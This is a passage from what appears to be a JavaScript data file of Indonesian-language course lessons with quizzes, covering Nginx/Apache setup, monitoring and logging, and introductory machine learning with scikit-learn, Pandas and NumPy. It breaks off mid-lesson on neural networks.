        options: ["systemctl start nginx", "systemctl enable nginx", "systemctl status nginx", "systemctl reload nginx"],
        answer: 1,
        explanation: "systemctl enable membuat service auto-start saat boot, sedangkan start hanya menjalankan saat ini."
      },
      {
        question: "Cron expression untuk job setiap 5 menit?",
        options: ["5 * * * *", "*/5 * * * *", "0 5 * * *", "* 5 * * *"],
        answer: 1,
        explanation: "*/5 di kolom menit berarti 'setiap 5 menit' pada cron expression."
      }
    ]
  },
  {
    level: 7,
    order: 7,
    title: "Web Server Nginx Apache",
    slug: "web-server-nginx-apache",
    description: "Setup Nginx/Apache, virtual host, reverse proxy, dan SSL.",
    icon: "🌐",
    isProject: false,
    content: `# Web Server: Nginx & Apache

Web server adalah software yang menerima HTTP request dari client dan mengembalikan response. **Nginx** dan **Apache** adalah dua web server paling populer di dunia.

## Nginx vs Apache

\`\`\`text
Nginx:
- Event-driven, async (1 thread handle ribuan koneksi)
- Sangat cepat untuk static file & reverse proxy
- Konfigurasi sederhana
- Cocok untuk high-traffic & microservices

Apache:
- Process/thread-based (1 thread per koneksi)
- .htaccess fleksibel (per-directory config)
- Module ecosystem matang (mod_rewrite, mod_php)
- Cocok untuk shared hosting
\`\`\`

## Nginx: Static Site + Virtual Host

\`\`\`nginx
# /etc/nginx/sites-available/example.com
server {
    listen 80;
    server_name example.com www.example.com;
    root /var/www/example.com;
    index index.html;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~* \\.(jpg|jpeg|png|gif|ico|css|js)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }

    # Custom error page
    error_page 404 /404.html;
}
\`\`\`

\`\`\`bash
# Enable site
sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/
sudo nginx -t              # test config
sudo systemctl reload nginx
\`\`\`

## Nginx: Reverse Proxy ke Node.js

\`\`\`nginx
server {
    listen 80;
    server_name api.example.com;

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
\`\`\`

## SSL/TLS dengan Let's Encrypt

\`\`\`bash
# Install Certbot
sudo apt install certbot python3-certbot-nginx -y

# Generate SSL certificate (otomatis edit config nginx)
sudo certbot --nginx -d example.com -d www.example.com

# Test auto-renewal
sudo certbot renew --dry-run

# Cron sudah otomatis:
# /etc/cron.d/certbot
\`\`\`

## Apache Virtual Host

\`\`\`apache
# /etc/apache2/sites-available/example.com.conf
<VirtualHost *:80>
    ServerName example.com
    ServerAlias www.example.com
    DocumentRoot /var/www/example.com

    <Directory /var/www/example.com>
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog \${APACHE_LOG_DIR}/example_error.log
    CustomLog \${APACHE_LOG_DIR}/example_access.log combined
</VirtualHost>
\`\`\`

\`\`\`bash
sudo a2ensite example.com.conf
sudo a2enmod rewrite ssl headers
sudo systemctl reload apache2
\`\`\`

## Security Headers

\`\`\`nginx
# Header keamanan di nginx
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
\`\`\`

> Untuk aplikasi modern, **Nginx sebagai reverse proxy** di depan aplikasi (Node/Python/Go) adalah pola paling umum.`,
    quiz: [
      {
        question: "Model arsitektur Nginx?",
        options: ["Thread per koneksi", "Event-driven async", "Fork per request", "Single-threaded blocking"],
        answer: 1,
        explanation: "Nginx event-driven async, sehingga 1 worker bisa handle ribuan koneksi bersamaan."
      },
      {
        question: "Tool gratis untuk SSL certificate otomatis?",
        options: ["OpenSSL", "Let's Encrypt (Certbot)", "DigiCert", "GeoTrust"],
        answer: 1,
        explanation: "Let's Encrypt (dengan Certbot) memberikan SSL certificate gratis dengan auto-renewal."
      },
      {
        question: "Direktif Nginx untuk meneruskan request ke app lain?",
        options: ["root", "try_files", "proxy_pass", "rewrite"],
        answer: 2,
        explanation: "proxy_pass meneruskan request ke upstream server (Node.js, Python, dll) di Nginx reverse proxy."
      }
    ]
  },
  {
    level: 7,
    order: 8,
    title: "Monitoring & Logging",
    slug: "monitoring-logging",
    description: "Prometheus, Grafana, ELK stack, dan log management.",
    icon: "📊",
    isProject: false,
    content: `# Monitoring & Logging

Tanpa monitoring, Anda buta terhadap kesehatan sistem. Logging tanpa monitoring hanya tumpukan data. Kombinasi keduanya — metrics + logs + traces — adalah fondasi observability modern.

## Tiga Pilar Observability

\`\`\`text
Metrics  : angka time-series (CPU, request rate, error rate)
Logs     : event diskrit dengan timestamp & konteks
Traces   : request journey lintas microservices
\`\`\`

## Stack Populer

\`\`\`text
Metrics : Prometheus (pull-based), Grafana (dashboard)
          InfluxDB, Datadog, New Relic
Logging : ELK (Elasticsearch + Logstash + Kibana)
          Loki + Promtail, Fluentd, Splunk
Tracing : Jaeger, Zipkin, OpenTelemetry, Honeycomb
\`\`\`

## Prometheus: Metrics Collection

\`\`\`yaml
# prometheus.yml
global:
  scrape_interval: 15s

scrape_configs:
  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']

  - job_name: 'app'
    static_configs:
      - targets: ['app:3000']
    metrics_path: /metrics
\`\`\`

## Instrumentasi App (Prom Client)

\`\`\`python
# Python: expose /metrics untuk Prometheus
from prometheus_client import Counter, Histogram, generate_latest
from flask import Flask, Response

app = Flask(__name__)
REQUEST_COUNT = Counter('http_requests_total', 'Total requests', ['method', 'endpoint'])
REQUEST_LATENCY = Histogram('http_request_duration_seconds', 'Request latency')

@app.route('/metrics')
def metrics():
    return Response(generate_latest(), mimetype='text/plain')

@app.route('/')
@REQUEST_LATENCY.time()
def home():
    REQUEST_COUNT.labels(method='GET', endpoint='/').inc()
    return 'Hello'
\`\`\`

## Grafana: Dashboard Visualisasi

\`\`\`text
- Connect ke Prometheus sebagai datasource
- Buat panel: time series, stat, gauge, table, heatmap
- Set alert: error rate > 5% selama 5 menit
- Notifikasi: Slack, PagerDuty, Email

Dashboard penting:
- RED  : Rate, Errors, Duration (untuk service)
- USE  : Utilization, Saturation, Errors (untuk resource)
- GOLDEN SIGNALS: Latency, Traffic, Errors, Saturation
\`\`\`

## ELK Stack: Centralized Logging

\`\`\`text
Elasticsearch : search engine & storage untuk logs
Logstash      : pipeline processing (parse, enrich, filter)
Kibana        : UI untuk search & visualisasi
Beats/Filebeat: agent di server yang kirim log
\`\`\`

\`\`\`bash
# Filebeat config minimal (kirim nginx access log)
cat /etc/filebeat/filebeat.yml
filebeat.inputs:
  - type: log
    paths:
      - /var/log/nginx/access.log
    fields:
      service: nginx
output.elasticsearch:
  hosts: ["elasticsearch:9200"]
\`\`\`

## Structured Logging Best Practice

\`\`\`python
# Python: structured JSON logging
import structlog
logger = structlog.get_logger()

logger.info("user_login",
    user_id=42,
    ip="10.0.0.1",
    method="password",
    success=True)
\`\`\`

JSON log lebih mudah di-parse dan dicari dibanding log plain text.

## Alerting Strategy

\`\`\`text
Prinsip alerting:
- Alert berdasarkan symptom (user impact), bukan cause
- Alertable: actionable (ada hal yang bisa dilakukan)
- Hindari alert storm: dedup & grouping
- SLI/SLO-based: error budget burn rate
- Page (wake on-call) hanya untuk critical user impact
\`\`\`

> "If it's not monitored, it doesn't exist in production." Observability bukan opsional — ia adalah prerequisite untuk sistem yang sehat.`,
    quiz: [
      {
        question: "Tiga pilar observability?",
        options: ["CPU, RAM, Disk", "Metrics, Logs, Traces", "Server, Network, Database", "Code, Test, Deploy"],
        answer: 1,
        explanation: "Tiga pilar observability modern adalah Metrics, Logs, dan Traces."
      },
      {
        question: "Stack untuk centralized logging dengan Elasticsearch?",
        options: ["Prometheus + Grafana", "ELK Stack", "Jaeger + Zipkin", "Nginx + Apache"],
        answer: 1,
        explanation: "ELK = Elasticsearch, Logstash, Kibana adalah stack logging paling populer."
      },
      {
        question: "Tool untuk dashboard visualisasi metrics?",
        options: ["Prometheus", "Grafana", "Logstash", "Kibana"],
        answer: 1,
        explanation: "Grafana adalah tool visualisasi yang sering dipasangkan dengan Prometheus untuk dashboard metrics."
      }
    ]
  },

  // ==================== LEVEL 8 - AI & MACHINE LEARNING (8) ====================
  {
    level: 8,
    order: 1,
    title: "Pengenalan AI & ML",
    slug: "pengenalan-ai-ml",
    description: "AI vs ML vs Deep Learning, jenis ML, dan aplikasinya.",
    icon: "🤖",
    isProject: false,
    content: `# Pengenalan AI & ML

**Artificial Intelligence (AI)** adalah bidang ilmu komputer yang membuat mesin meniru kecerdasan manusia. AI adalah payung besar yang mencakup Machine Learning dan Deep Learning.

## Hierarki AI

\`\`\`text
Artificial Intelligence (AI)
  ├── Machine Learning (ML)
  │     ├── Supervised Learning
  │     ├── Unsupervised Learning
  │     └── Reinforcement Learning
  └── Deep Learning (DL)
        ├── Neural Networks
        ├── CNN (Computer Vision)
        ├── RNN/LSTM/Transformer (NLP)
        └── Generative Models (GAN, LLM)
\`\`\`

## Perbedaan AI vs ML vs DL

\`\`\`text
AI    : mesin terlihat "cerdas" (rule-based pun bisa)
ML    : mesin belajar pola dari DATA tanpa diprogram eksplisit
DL    : ML dengan neural network berlapis (banyak layer)
\`\`\`

## Jenis Machine Learning

\`\`\`text
1. Supervised Learning
   - Data berlabel (X -> y)
   - Contoh: klasifikasi email spam, prediksi harga rumah
   - Algoritma: Linear Regression, Decision Tree, Random Forest, SVM

2. Unsupervised Learning
   - Data tanpa label
   - Contoh: customer segmentation, anomaly detection
   - Algoritma: K-Means, PCA, DBSCAN

3. Reinforcement Learning
   - Agent belajar dari reward/punishment
   - Contoh: game AI, robot, self-driving
   - Algoritma: Q-Learning, PPO, DQN

4. Semi-supervised Learning
   - Sebagian data berlabel, sebagian tidak

5. Self-supervised Learning
   - Label dibuat otomatis dari data (pre-training LLM)
\`\`\`

## Workflow ML

\`\`\`text
1. Problem definition
2. Data collection
3. Data preprocessing (cleaning, encoding, split)
4. Model selection
5. Training
6. Evaluation (metrics: accuracy, F1, RMSE)
7. Hyperparameter tuning
8. Deployment
9. Monitoring & retraining
\`\`\`

## Hello ML dengan scikit-learn

\`\`\`python
from sklearn.datasets import load_iris
from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import accuracy_score, classification_report

# Load data
X, y = load_iris(return_X_y=True)
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

# Train model
model = RandomForestClassifier(n_estimators=100, random_state=42)
model.fit(X_train, y_train)

# Evaluate
y_pred = model.predict(X_test)
print(f"Accuracy: {accuracy_score(y_test, y_pred):.4f}")
print(classification_report(y_test, y_pred))
\`\`\`

## Aplikasi AI/ML

\`\`\`text
- Computer Vision  : face recognition, medical imaging, OCR
- NLP              : chatbot, translation, sentiment analysis
- Recommendation   : Netflix, Spotify, e-commerce
- Speech           : voice assistant (Siri, Alexa), TTS/STT
- Autonomous       : self-driving car, drone
- Generative AI    : ChatGPT, Midjourney, Copilot
- Anomaly Detect   : fraud detection, predictive maintenance
\`\`\`

> Data adalah bahan bakar ML. **Model secanggih apa pun akan buruk dengan data buruk** ("garbage in, garbage out").`,
    quiz: [
      {
        question: "ML yang menggunakan data berlabel disebut?",
        options: ["Unsupervised Learning", "Supervised Learning", "Reinforcement Learning", "Self-supervised Learning"],
        answer: 1,
        explanation: "Supervised Learning menggunakan data berlabel (X -> y) untuk mempelajari mapping input ke output."
      },
      {
        question: "Hierarki yang benar?",
        options: ["ML ⊃ AI ⊃ DL", "AI ⊃ ML ⊃ DL", "DL ⊃ AI ⊃ ML", "AI = ML = DL"],
        answer: 1,
        explanation: "AI adalah payung terbesar, mencakup ML, yang mencakup Deep Learning."
      },
      {
        question: "Algoritma yang termasuk Unsupervised Learning?",
        options: ["Random Forest", "Linear Regression", "K-Means Clustering", "SVM"],
        answer: 2,
        explanation: "K-Means adalah algoritma clustering unsupervised yang mengelompokkan data tanpa label."
      }
    ]
  },
  {
    level: 8,
    order: 2,
    title: "Python untuk Data Science",
    slug: "python-data-science",
    description: "NumPy, Pandas, Matplotlib - library Python untuk data science.",
    icon: "📊",
    isProject: false,
    content: `# Python untuk Data Science

Python adalah bahasa dominan untuk data science berkat ekosistem library yang kaya: **NumPy** untuk komputasi numerik, **Pandas** untuk manipulasi data, **Matplotlib/Seaborn** untuk visualisasi.

## Library Inti

\`\`\`text
NumPy       : array N-dimensi, operasi vektor/matrix cepat
Pandas      : DataFrame (seperti Excel di kode), manipulasi tabular
Matplotlib  : plotting low-level, fleksibel
Seaborn     : statistical visualization, di atas matplotlib
Scikit-learn: machine learning classic
Plotly      : interactive visualization
\`\`\`

## Install & Import

\`\`\`bash
# Install library
pip install numpy pandas matplotlib seaborn scikit-learn jupyter

# Jalankan Jupyter Notebook
jupyter notebook
\`\`\`

\`\`\`python
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
\`\`\`

## NumPy: Operasi Array

\`\`\`python
import numpy as np

# Buat array
a = np.array([1, 2, 3, 4, 5])
b = np.array([[1, 2, 3], [4, 5, 6]])

# Operasi vektor (cepat, tanpa loop Python)
print(a * 2)              # [2 4 6 8 10]
print(a.mean(), a.std())  # 3.0 1.4142...
print(b.shape, b.T)       # transpose matrix

# Broadcasting
c = np.arange(12).reshape(3, 4)
print(c.sum(axis=0))      # sum per kolom
print(c.sum(axis=1))      # sum per baris
\`\`\`

## Pandas: DataFrame Manipulation

\`\`\`python
import pandas as pd

# Load CSV
df = pd.read_csv('sales.csv')

# Inspeksi data
print(df.head())           # 5 baris pertama
print(df.info())           # tipe data & non-null count
print(df.describe())       # statistik deskriptif

# Filtering & selection
high_sales = df[df['amount'] > 1000000]
top_customers = df.nlargest(10, 'amount')

# Group by & aggregation
sales_by_region = df.groupby('region')['amount'].agg(['sum', 'mean', 'count'])

# Handle missing value
df['amount'].fillna(df['amount'].median(), inplace=True)
df.dropna(subset=['customer_id'], inplace=True)

# New column
df['profit_margin'] = df['profit'] / df['amount'] * 100
\`\`\`

## Matplotlib & Seaborn: Visualisasi

\`\`\`python
import matplotlib.pyplot as plt
import seaborn as sns

# Line chart
plt.figure(figsize=(10, 5))
plt.plot(df['date'], df['amount'])
plt.title('Tren Penjualan')
plt.xlabel('Tanggal'); plt.ylabel('Penjualan (Rp)')
plt.savefig('sales_trend.png', dpi=150, bbox_inches='tight')

# Seaborn: distribusi & korelasi
sns.histplot(df['amount'], kde=True)
plt.title('Distribusi Penjualan')

# Heatmap korelasi
corr = df.corr(numeric_only=True)
sns.heatmap(corr, annot=True, cmap='coolwarm')
\`\`\`

## Workflow EDA (Exploratory Data Analysis)

\`\`\`text
1. Load data & cek struktur
2. Cek missing value & duplicate
3. Statistik deskriptif (mean, median, std)
4. Visualisasi distribusi tiap fitur
5. Cek korelasi antar fitur
6. Identifikasi outlier
7. Formulasi hipotesis
\`\`\`

> 80% pekerjaan data scientist adalah **memahami dan membersihkan data**. EDA yang teliti menghasilkan model yang lebih baik.`,
    quiz: [
      {
        question: "Library Python untuk manipulasi data tabular?",
        options: ["NumPy", "Pandas", "Matplotlib", "TensorFlow"],
        answer: 1,
        explanation: "Pandas menyediakan DataFrame untuk manipulasi data tabular seperti Excel di kode Python."
      },
      {
        question: "Library untuk komputasi array N-dimensi di Python?",
        options: ["NumPy", "Pandas", "Seaborn", "Keras"],
        answer: 0,
        explanation: "NumPy menyediakan ndarray untuk operasi vektor/matrix yang cepat di Python."
      },
      {
        question: "Fungsi Pandas untuk lihat 5 baris pertama DataFrame?",
        options: ["df.first()", "df.head()", "df.top()", "df.preview()"],
        answer: 1,
        explanation: "df.head() mengembalikan 5 baris pertama DataFrame secara default."
      }
    ]
  },
  {
    level: 8,
    order: 3,
    title: "Data Preprocessing",
    slug: "data-preprocessing",
    description: "Cleaning, normalisasi, feature encoding, dan train-test split.",
    icon: "🧹",
    isProject: false,
    content: `# Data Preprocessing

**Data preprocessing** adalah tahap mengubah raw data menjadi format yang siap dipakai model ML. Kualitas data yang diproses langsung menentukan performa model — "garbage in, garbage out".

## Langkah Preprocessing

\`\`\`text
1. Data Cleaning     : handle missing value, duplicate, typo
2. Encoding          : kategorikal -> numerik
3. Scaling/Normalize : standarisasi range fitur
4. Feature Engineering: buat fitur baru
5. Train-Test Split  : pisah data untuk evaluasi
6. Handle Imbalance  : oversampling/undersampling
\`\`\`

## Data Cleaning

\`\`\`python
import pandas as pd

df = pd.read_csv('data.csv')

# Cek missing value
print(df.isnull().sum())

# Drop baris dengan terlalu banyak missing
df = df.dropna(thresh=len(df.columns) - 2)

# Isi missing numerik dengan median
df['age'].fillna(df['age'].median(), inplace=True)

# Isi missing kategorikal dengan modus
df['city'].fillna(df['city'].mode()[0], inplace=True)

# Hapus duplikat
df = df.drop_duplicates()

# Fix typo dengan mapping
df['gender'] = df['gender'].replace({'M': 'Male', 'F': 'Female', 'Femle': 'Female'})
\`\`\`

## Feature Encoding

\`\`\`python
from sklearn.preprocessing import LabelEncoder, OneHotEncoder

# Label encoding (untuk ordinal: Low/Med/High -> 0/1/2)
le = LabelEncoder()
df['education_level'] = le.fit_transform(df['education_level'])

# One-hot encoding (untuk nominal: kategori tanpa urutan)
df = pd.get_dummies(df, columns=['city', 'gender'], drop_first=True)

# Target encoding (untuk high cardinality)
means = df.groupby('zip_code')['target'].mean()
df['zip_code_enc'] = df['zip_code'].map(means)
\`\`\`

## Scaling & Normalization

\`\`\`python
from sklearn.preprocessing import StandardScaler, MinMaxScaler, RobustScaler

# StandardScaler: mean=0, std=1 (default untuk ML)
scaler = StandardScaler()
df[['age', 'income', 'balance']] = scaler.fit_transform(df[['age', 'income', 'balance']])

# MinMaxScaler: range 0-1 (untuk neural network)
minmax = MinMaxScaler()
df_scaled = minmax.fit_transform(df[['age', 'income']])

# RobustScaler: tahan outlier (pakai median & IQR)
robust = RobustScaler()
df[['age']] = robust.fit_transform(df[['age']])
\`\`\`

## Train-Test Split

\`\`\`python
from sklearn.model_selection import train_test_split

X = df.drop('target', axis=1)
y = df['target']

# Stratified split untuk klasifikasi (jaga proporsi kelas)
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, random_state=42, stratify=y
)

print(f"Train: {X_train.shape}, Test: {X_test.shape}")
print(f"Train target distribution:\\n{y_train.value_counts(normalize=True)}")
\`\`\`

## Handle Imbalanced Data

\`\`\`python
from imblearn.over_sampling import SMOTE
from imblearn.under_sampling import RandomUnderSampler

# Oversampling minoritas dengan SMOTE
smote = SMOTE(random_state=42)
X_res, y_res = smote.fit_resample(X_train, y_train)

# Undersampling mayoritas
undersample = RandomUnderSampler(random_state=42)
X_res, y_res = undersample.fit_resample(X_train, y_train)

# Atau pakai class_weight di model (tanpa ubah data)
# model = RandomForestClassifier(class_weight='balanced')
\`\`\`

## Best Practices

\`\`\`text
- FIT scaler/encoder HANYA di train, TRANSFORM di test
- Gunakan sklearn Pipeline untuk hindari data leakage
- Cross-validation untuk evaluasi yang robust
- Simpan preprocessing object (joblib) untuk deployment
- Dokumentasi setiap transformasi untuk reproducibility
\`\`\`

> **Data leakage** adalah musuh utama ML. Jangan pernah fit preprocessor di seluruh dataset — selalu di train fold saja.`,
    quiz: [
      {
        question: "Encoding untuk fitur kategorikal ordinal (ada urutan)?",
        options: ["One-Hot Encoding", "Label Encoding", "Target Encoding", "Frequency Encoding"],
        answer: 1,
        explanation: "Label encoding cocok untuk fitur ordinal (Low/Med/High -> 0/1/2) yang punya urutan alami."
      },
      {
        question: "Scaler yang tahan terhadap outlier?",
        options: ["StandardScaler", "MinMaxScaler", "RobustScaler", "MaxAbsScaler"],
        answer: 2,
        explanation: "RobustScaler menggunakan median dan IQR sehingga tidak terpengaruh outlier."
      },
        {
        question: "Penting: kapan fit scaler dilakukan?",
        options: ["Di seluruh dataset", "Hanya di train set, transform di test", "Hanya di test set", "Setelah training model"],
        answer: 1,
        explanation: "Scaler di-fit hanya di train set untuk mencegah data leakage dari test set."
      }
    ]
  },
  {
    level: 8,
    order: 4,
    title: "Supervised Learning",
    slug: "supervised-learning",
    description: "Regression, classification, decision tree, dan random forest.",
    icon: "📚",
    isProject: false,
    content: `# Supervised Learning

**Supervised Learning** adalah paradigma ML di mana model belajar dari data berlabel (input X dan target y). Tujuannya: memetakan input ke output untuk prediksi data baru.

## Dua Jenis Utama

\`\`\`text
Regression   : target numerik kontinu (harga, suhu, umur)
Classification: target kategorikal (spam/ham, fraud/legit, kelas)

Algoritma populer:
- Linear Regression
- Logistic Regression
- Decision Tree
- Random Forest
- Gradient Boosting (XGBoost, LightGBM)
- Support Vector Machine (SVM)
- K-Nearest Neighbors (KNN)
- Naive Bayes
\`\`\`

## Linear Regression

\`\`\`python
from sklearn.linear_model import LinearRegression
from sklearn.metrics import mean_squared_error, r2_score

model = LinearRegression()
model.fit(X_train, y_train)

y_pred = model.predict(X_test)
print(f"RMSE: {np.sqrt(mean_squared_error(y_test, y_pred)):.2f}")
print(f"R²: {r2_score(y_test, y_pred):.4f}")
print(f"Coefficients: {model.coef_}")
\`\`\`

## Logistic Regression (Klasifikasi)

\`\`\`python
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score, confusion_matrix, classification_report

model = LogisticRegression(max_iter=1000, class_weight='balanced')
model.fit(X_train, y_train)

y_pred = model.predict(X_test)
y_proba = model.predict_proba(X_test)[:, 1]  # probabilitas kelas positif

print(classification_report(y_test, y_pred))
print(confusion_matrix(y_test, y_pred))
\`\`\`

## Decision Tree

\`\`\`python
from sklearn.tree import DecisionTreeClassifier, plot_tree
import matplotlib.pyplot as plt

dt = DecisionTreeClassifier(
    max_depth=5,
    min_samples_split=20,
    min_samples_leaf=10,
    random_state=42
)
dt.fit(X_train, y_train)

# Visualisasi tree
plt.figure(figsize=(20, 8))
plot_tree(dt, feature_names=X.columns, class_names=['No', 'Yes'], filled=True)
plt.savefig('decision_tree.png', dpi=100, bbox_inches='tight')
\`\`\`

## Random Forest (Ensemble)

\`\`\`python
from sklearn.ensemble import RandomForestClassifier

rf = RandomForestClassifier(
    n_estimators=200,
    max_depth=10,
    min_samples_leaf=5,
    n_jobs=-1,
    random_state=42
)
rf.fit(X_train, y_train)

# Feature importance
importances = pd.Series(rf.feature_importances_, index=X.columns)
print(importances.sort_values(ascending=False).head(10))

# Out-of-bag score (tanpa test set)
rf_oob = RandomForestClassifier(oob_score=True, random_state=42)
rf_oob.fit(X_train, y_train)
print(f"OOB Score: {rf_oob.oob_score_:.4f}")
\`\`\`

## Metrik Evaluasi

\`\`\`text
Regression:
- MAE, MSE, RMSE
- R² (coefficient of determination)

Classification (binary):
- Accuracy    : (TP+TN)/total
- Precision   : TP/(TP+FP) - fokus false positive
- Recall      : TP/(TP+FN) - fokus false negative
- F1-Score    : harmonic mean precision & recall
- ROC-AUC     : area under ROC curve
- Confusion Matrix

Pilih metrik sesuai konteks bisnis:
- Fraud detection   : recall tinggi (jangan lewatkan fraud)
- Spam filter       : precision tinggi (jangan blok email valid)
- Medical diagnosis : F1 atau recall (sensitif)
\`\`\`

## Cross-Validation

\`\`\`python
from sklearn.model_selection import cross_val_score, StratifiedKFold

cv = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)
scores = cross_val_score(rf, X, y, cv=cv, scoring='f1')
print(f"F1 per fold: {scores}")
print(f"Mean F1: {scores.mean():.4f} ± {scores.std():.4f}")
\`\`\`

> Tidak ada algoritma "terbaik" universal — gunakan **No Free Lunch theorem**. Selalu benchmark beberapa algoritma dengan cross-validation.`,
    quiz: [
      {
        question: "Supervised learning untuk target numerik kontinu?",
        options: ["Classification", "Regression", "Clustering", "Reinforcement"],
        answer: 1,
        explanation: "Regression memprediksi nilai numerik kontinu (harga, suhu) dari input berlabel."
      },
      {
        question: "Metrik terbaik untuk fraud detection?",
        options: ["Accuracy", "Precision", "Recall", "R²"],
        answer: 2,
        explanation: "Recall tinggi penting di fraud detection agar kasus fraud tidak terlewat (minim false negative)."
      },
      {
        question: "Random Forest adalah contoh metode?",
        options: ["Single model", "Ensemble learning", "Neural network", "Unsupervised"],
        answer: 1,
        explanation: "Random Forest adalah ensemble dari banyak decision tree yang voting untuk klasifikasi."
      }
    ]
  },
  {
    level: 8,
    order: 5,
    title: "Unsupervised Learning",
    slug: "unsupervised-learning",
    description: "Clustering K-Means, PCA, dan dimensionality reduction.",
    icon: "🔍",
    isProject: false,
    content: `# Unsupervised Learning

**Unsupervised Learning** adalah paradigma ML di mana model menemukan pola dari data **tanpa label**. Tidak ada target y — algoritma mengelompokkan, mereduksi, atau mendeteksi anomali berdasarkan struktur data.

## Jenis Unsupervised Learning

\`\`\`text
1. Clustering        : kelompokkan data serupa
   - K-Means, Hierarchical, DBSCAN, Gaussian Mixture

2. Dimensionality Reduction : reduksi fitur
   - PCA, t-SNE, UMAP, Autoencoder

3. Association Rules  : temukan aturan (market basket)
   - Apriori, FP-Growth

4. Anomaly Detection  : deteksi outlier
   - Isolation Forest, One-Class SVM
\`\`\`

## K-Means Clustering

\`\`\`python
from sklearn.cluster import KMeans
from sklearn.metrics import silhouette_score

# Tentukan k optimal dengan elbow method & silhouette
inertias, silhouettes = [], []
K = range(2, 11)
for k in K:
    km = KMeans(n_clusters=k, random_state=42, n_init=10)
    labels = km.fit_predict(X_scaled)
    inertias.append(km.inertia_)
    silhouettes.append(silhouette_score(X_scaled, labels))

# Plot elbow
import matplotlib.pyplot as plt
fig, ax = plt.subplots(1, 2, figsize=(12, 4))
ax[0].plot(K, inertias, 'o-'); ax[0].set_title('Elbow Method')
ax[1].plot(K, silhouettes, 'o-'); ax[1].set_title('Silhouette Score')
plt.savefig('kmeans_eval.png', dpi=100)

# Final model dengan k terbaik (misal k=4)
kmeans = KMeans(n_clusters=4, random_state=42, n_init=10)
clusters = kmeans.fit_predict(X_scaled)
df['cluster'] = clusters
\`\`\`

## DBSCAN: Density-Based

\`\`\`python
from sklearn.cluster import DBSCAN

# Tidak perlu tentukan k, otomatis deteksi noise
dbscan = DBSCAN(eps=0.5, min_samples=5)
clusters = dbscan.fit_predict(X_scaled)
# label -1 = noise/outlier
print(f"Clusters: {set(clusters)}")
print(f"Noise points: {(clusters == -1).sum()}")
\`\`\`

## PCA: Dimensionality Reduction

\`\`\`python
from sklearn.decomposition import PCA

# Reduksi ke 2D untuk visualisasi
pca = PCA(n_components=2)
X_pca = pca.fit_transform(X_scaled)

print(f"Explained variance: {pca.explained_variance_ratio_}")
print(f"Total: {pca.explained_variance_ratio_.sum():.4f}")

# Visualisasi cluster di 2D
plt.figure(figsize=(8, 6))
plt.scatter(X_pca[:, 0], X_pca[:, 1], c=df['cluster'], cmap='viridis', alpha=0.6)
plt.xlabel(f'PC1 ({pca.explained_variance_ratio_[0]:.1%})')
plt.ylabel(f'PC2 ({pca.explained_variance_ratio_[1]:.1%})')
plt.title('PCA: 2D Projection')
plt.savefig('pca.png', dpi=100)
\`\`\`

## t-SNE & UMAP (Non-linear)

\`\`\`python
from sklearn.manifold import TSNE
# import umap  # pip install umap-learn

# t-SNE: bagus untuk visualisasi, lambat untuk data besar
tsne = TSNE(n_components=2, perplexity=30, random_state=42)
X_tsne = tsne.fit_transform(X_scaled)

# UMAP: lebih cepat & preserve struktur global
# reducer = umap.UMAP(n_components=2, random_state=42)
# X_umap = reducer.fit_transform(X_scaled)
\`\`\`

## Anomaly Detection

\`\`\`python
from sklearn.ensemble import IsolationForest

# Deteksi outlier (fraud, defect, anomaly)
iso = IsolationForest(contamination=0.05, random_state=42)
anomaly_labels = iso.fit_predict(X_scaled)
# -1 = anomaly, 1 = normal

df['is_anomaly'] = anomaly_labels == -1
print(f"Anomalies detected: {df['is_anomaly'].sum()}")
\`\`\`

## Use Cases

\`\`\`text
- Customer segmentation : K-Means untuk marketing targeted
- Anomaly detection     : fraud, defect produk, intrusion
- Recommendation        : clustering user untuk collaborative filter
- Image compression     : PCA untuk reduce dimensi pixel
- Visualization         : t-SNE/UMAP untuk lihat high-dim data
- Preprocessing         : PCA sebelum supervised learning
\`\`\`

> Unsupervised learning butuh **domain expertise** untuk interpretasi cluster. K-Means memberi kelompok, tetapi Anda yang harus memberi makna.`,
    quiz: [
      {
        question: "Algoritma clustering yang tidak perlu menentukan jumlah cluster?",
        options: ["K-Means", "DBSCAN", "Hierarchical (agglomerative)", "Gaussian Mixture"],
        answer: 1,
        explanation: "DBSCAN berbasis density, tidak perlu k — secara otomatis menentukan cluster & noise."
      },
      {
        question: "Metode untuk menentukan k optimal di K-Means?",
        options: ["Confusion Matrix", "Elbow Method & Silhouette", "R² Score", "F1 Score"],
        answer: 1,
        explanation: "Elbow Method (inertia) dan Silhouette Score adalah metode umum menentukan k optimal di K-Means."
      },
      {
        question: "Tujuan utama PCA?",
        options: ["Klasifikasi", "Clustering", "Reduksi dimensi", "Imputasi missing"],
        answer: 2,
        explanation: "PCA (Principal Component Analysis) mereduksi dimensi fitur sambil mempertahankan varians maksimum."
      }
    ]
  },
  {
    level: 8,
    order: 6,
    title: "Neural Networks",
    slug: "neural-networks",
    description: "Perceptron, activation function, backpropagation, dan MLP.",
    icon: "🧠",
    isProject: false,
    content: `# Neural Networks

**Neural Network** adalah model yang terinspirasi dari otak manusia, terdiri dari neuron buatan yang terhubung dalam layer. Neural network adalah fondasi Deep Learning.

## Anatomi Neural Network

\`\`\`text
Input Layer  : menerima fitur (X)
Hidden Layer : layer tengah, belajar representasi
Output Layer : menghasilkan prediksi (y_hat)

Setiap neuron:
output = activation(Σ(w_i * x_i) + bias)

Komponen:
